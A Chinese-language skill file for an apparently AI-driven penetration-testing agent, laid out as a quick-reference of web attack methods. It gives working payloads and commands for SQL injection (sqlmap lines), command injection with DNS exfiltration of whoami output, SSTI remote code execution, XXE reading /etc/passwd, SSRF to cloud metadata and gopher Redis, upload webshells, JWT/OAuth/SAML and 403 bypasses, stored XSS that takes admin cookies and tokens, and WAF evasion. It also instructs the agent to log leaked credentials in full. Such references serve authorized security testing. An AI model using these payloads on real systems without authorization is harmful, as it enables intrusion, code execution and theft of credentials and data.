---
name: web-attack-methods
description: 对 Web 应用做注入、认证绕过、服务端与前端漏洞测试时调用——SQLi/命令注入/SSTI/XXE/SSRF/XSS/文件上传/LFI/反序列化/JWT/OAuth/SAML/NoSQL 的验证手法与绕过清单。当意图涉及「测注入/测越权/绕认证/传 shell/读文件」时使用。
tags:
  cwe: [CWE-89, CWE-78, CWE-94, CWE-79, CWE-918, CWE-22, CWE-434, CWE-502, CWE-639, CWE-287]
  attack: [T1190, T1059, T1090]
  class: [sql-injection, command-injection, ssti, xxe, ssrf, xss, file-upload, lfi, auth-bypass]
---

# Web 攻击手法速查

## 使用纪律

- 先指纹（框架/中间件/语言/参数结构），再选手法；**不要盲打**。
- 每条结论必须有真实请求+响应；用 `http_probe` 批量探活、curl 取完整回显。
- SQLi 必须附可直接复测的 sqlmap 命令；XSS/SSRF 附最小 payload 与回显证据。
- 严重性按证据分级：能拿到真实数据/命令回显=L3+ 才报 high/critical。

## 注入

### SQL 注入
- 探测：`'`、`''`、`\`、数字加减（`id=1` → `id=2-1`）；报错/布尔/时间三路互证。
- 类型判断：数字型 `1 AND 1=1`、字符型 `' AND '1'='1`、括号型 `') AND ('1'='1`。
- 手工确认：
  - 布尔：`' AND 1=1-- -` vs `' AND 1=2-- -` 页面差异；
  - 时间：`' AND SLEEP(5)-- -`（MySQL）/ `';WAITFOR DELAY '0:0:5'--`（MSSQL）/ `pg_sleep(5)`（PG）；
  - 报错：`extractvalue(1,concat(0x7e,version()))`、`updatexml`。
- 自动化（结果必须人工复核回显）：
  ```bash
  sqlmap -u "http://target/item?id=1" --batch --level=3 --risk=2 --technique=BEUSTQ
  # 带登录态/参数位置明确时：
  sqlmap -u "http://target/api?id=1" --cookie "SESSION=..." -p id --dbms=mysql --current-db --current-user
  # POST JSON（用 * 标注注入点）：
  sqlmap -u "http://target/api/login" --data '{"username":"a*","password":"b"}' --headers "Content-Type: application/json"
  ```
- 绕过：注释 `/**/`、大小写、`%0b`、`+`/`%20` 混用、`UNION SELECT` 列数用 `ORDER BY` 试探；
  WAF 场景见文末「WAF 绕过」。
- 升级路径：`FILE` 权限 → OUTFILE webshell；MSSQL → `xp_cmdshell`；PG → `COPY ... PROGRAM`。

### 命令注入
- 载荷：`; id`、`| id`、`|| id`、`&& id`、`$(id)`、`` `id` ``、`%0a id`；
- 无回显时：时间盲 `; sleep 5`、DNS 外带 `; nslookup $(whoami).<oob域>`（用 interactsh）；
- 绕空格：`$IFS`、`${IFS}`、`%09`；绕关键字：`c\at /etc/passwd`、`tac`、`nl`、`rev`；
- 结论证据：命令回显原文（whoami/id/hostname），不要只报「疑似」。

### SSTI
- 探测：`{{7*7}}`（Jinja2/Twig）、`${7*7}`（FreeMarker/JSP EL）、`#{7*7}`（Ruby）、`<%= 7*7 %>`。
- Jinja2 RCE：`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`；
  FreeMarker：`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`。
- 先报「模板引擎识别 + 表达式求值成功」，RCE 属高危需完整命令回显。

### XXE
- 经典：`<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`；
- OOB：`<!ENTITY % p SYSTEM "http://<oob>/x.dtd">%p;`（interactsh 收 DNS/HTTP）；
- 盲 XXE 走 DNS 即可证明解析成功；读文件内容属 L3 证据。

### NoSQL（Mongo）
- `{"username":{"$ne":null},"password":{"$ne":null}}`、`{"$regex":"^a"}`、`{"$where":"sleep(5000)"}`；
- 注意 JSON 请求体与参数污染（`username[$ne]=` 形式）。

## 认证与授权

- 认证绕过：`admin'--`、密码重置可预测 token、Host 头投毒、X-Forwarded-For 伪造内网；
- 越权（IDOR）：换对象 ID 水平越权、`{"role":"admin"}` 批量赋值、UUID 可枚举；
  用 `auth_request` 组装**第二个身份**的对照请求，`diff_responses` 对比响应体；
- JWT：`alg:none`、RS256→HS256 混淆、弱密钥爆破（`hashcat -m 16500`）、`kid` 注入、`jku/x5u` 指向自有 JWKS；
- OAuth/OIDC：`redirect_uri` 子串/后缀/@ 混淆、缺 `state`（CSRF）、PKCE 降级、`id_token` 当成普通 JWT 打；
- SAML：签名包装（XSW）、签名剥离、注释截断 `admin<!---->@evil.com`；
- 401/403 绕过：`/admin/`、`/Admin`、`/%2e/admin`、`/admin;`、`/admin..;/`、
  `X-Original-URL` / `X-Rewrite-URL` / `X-Forwarded-For: 127.0.0.1`。

## 服务端

- LFI：`../../../etc/passwd`、`php://filter/convert.base64-encode/resource=index.php`、
  `data://`、`phar://`（反序列化）、日志投毒（UA 写 `<?php ...?>` → 包含日志）；
- 文件上传：`shell.php.jpg`、`.PHP`、`.php.`、`%00` 截断（老版本）、`.htaccess` 改解析、
  `GIF89a` 幻数 + 代码；上传成功后必须拿到执行回显，否则只算「可上传」；
- 反序列化：Java（ysoserial/CC 链）、PHP（`__wakeup`/`__destruct`）、Python pickle、
  .NET（`TypeConfuseDelegate`）——先定位 sink，再选链，禁止无脑打 gadget；
- Spring 特殊路径：`/actuator` 白名单 + `/actuator/../api/...` 穿越绕过拦截器；
  `X-HTTP-Method-Override` 改写方法；
- SSRF：`127.0.0.1` 变体（`2130706433`、`[::1]`、`0x7f000001`）、`#@`、`nip.io` 解析；
  云元数据 `169.254.169.254` / `metadata.google.internal`；`gopher://` 打 Redis/MySQL；
- 反序列化/模板/上传类结论需带完整利用链或最小回显，否则降级为 medium。

## 前端

- XSS：HTML/属性/JS 上下文分别构造；DOM XSS 看 `innerHTML`/`document.write`/`eval`；
- 存储型 XSS（客服/工单/IM）：消息经 WebSocket/STOMP 进入 agent 面板，`innerHTML` 渲染 →
  在**管理员浏览器**执行；payload 目标 `document.cookie`、`localStorage` token，外带用 interactsh；
- CSP 绕过：JSONP 端点、AngularJS CDN 白名单、`base-uri` 缺失；
- 前端泄露：sourcemap（`.js.map`）、硬编码密钥/AK/SK、内部接口地址、测试环境域名——
  立即落 fact（凭据全文），并纳入后续测试。

## WAF / CDN 绕过要点

- 编码层：URL 双重编码、Unicode、`%0b`、分块传输、大小写/注释；
- 语义层：等价函数替换（`SLEEP`→`BENCHMARK`）、同义参数、JSON 嵌套；
- 基础设施层：源站 IP 泄露（历史 DNS、证书、子域）、CDN 未覆盖端口（`8080/8443`）、
  `X-Forwarded-Host` 改写；
- 若确认被 WAF 拦（如 403 页面特征）→ 记录「拦截机制+可绕过性」，不要在报告里当成漏洞。

## 落库与升级

- 每个确认点：`record_fact`（含请求/响应关键行）；确认影响后 `report_finding` 并绑定流量证据；
- 同一参数多种手法失败 → 落负结果 fact，避免重复打；
- 想升级严重性必须给出「真实影响」：命令回显、文件内容、越权读到的他人数据；
  仅有报错/延迟 → 最多 medium 并注明利用条件。
